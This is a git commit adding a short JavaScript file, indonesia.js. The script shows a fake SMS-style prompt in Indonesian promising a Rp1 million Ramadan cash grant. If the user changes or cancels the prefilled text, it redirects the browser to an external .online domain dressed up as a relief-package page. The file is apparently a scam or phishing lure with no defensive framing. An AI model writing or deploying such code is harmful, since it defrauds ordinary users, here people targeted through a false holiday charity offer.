27e64525dd0a3e2623f5246a3cdf9d443cbd15e8
newetijazz10 <newetijazz10@gmail.com>
2026-02-08 11:27:50 +0100

    Create indonesia.js

---
+++ indonesia.js
@@ -0,0 +1,5 @@
+var password = 'Tarik Rp1 Juta'
+password=prompt('SMS: Selamat datang di program hibah tunai Rp1 Juta untuk perayaan Ramadan tahun ini! Klik "OK" untuk menerima penawaran menarik ini..','Tarik Rp1 Juta');
+if (password != 'Tarik Rp1 Juta') {
+location.href='https://www.favmrzi.online/Rp1Juta-ramadan-relief-packages';
+}
